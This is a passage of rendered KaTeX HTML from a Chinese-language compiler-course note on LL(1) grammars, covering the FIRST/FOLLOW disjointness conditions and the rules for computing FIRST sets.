style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,且候选式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub><mtext>，</mtext><msub><mi>α</mi><mn>2</mn></msub><mtext>，</mtext><mo>…</mo><mtext>，</mtext><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">α_1，α_2，…，α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中有相同的终结首符号</li></ul></li><li>避免的前提条件：<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>α</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">α_1, α_2, …, α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>等各符号串的终结首符号集合总是两两互不相交的</li><li>但当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">a_j \rightarrow^{*}\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9748em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>时，仅有上述条件不够，需要达成LL(1)文法条件</li></ul></li></ul><h4 id="ll(1)%E6%96%87%E6%B3%95" tabindex="-1">LL(1)文法</h4><ul><li><p>定义：</p><ul><li>文法中任一形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">U→α_1|α_2|…|α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的产生式满足：<ul><li><ol><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>α</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">α_1, α_2, …, α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的终结首符号集两两互不相交，即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>⋂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">!</mo><mo>=</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(α_i)\bigcap FIRST(α_j)=\phi(i!=j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋂</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="2"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub><msup><mo>→</mo><mo>∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">a_j\rightarrow^*\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9748em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>文法还用是满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>⋂</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">FIRST(α_i)\bigcap FOLLOW(U)=\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋂</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ϕ</span></span></span></span></eq></li></ol></li></ul></li></ul></li><li><p>计算FIRST集合</p><ul><li>若 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mi>X</mi><mo>∈</mo><mo stretchy="false">(</mo><msub><mi>V</mi><mi>U</mi></msub><mo>⋃</mo><msub><mi>V</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\alpha=X\in (V_U \bigcup V_T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋃</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq>构造为<ul><li><ol><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">X\in V_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>X</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FIRST(X)=\{X\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">}</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">X\in V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,相应产生式为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>a</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">X\rightarrow a...,a\in V_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a\in FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq>,若有相应产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">X\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>，则 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo 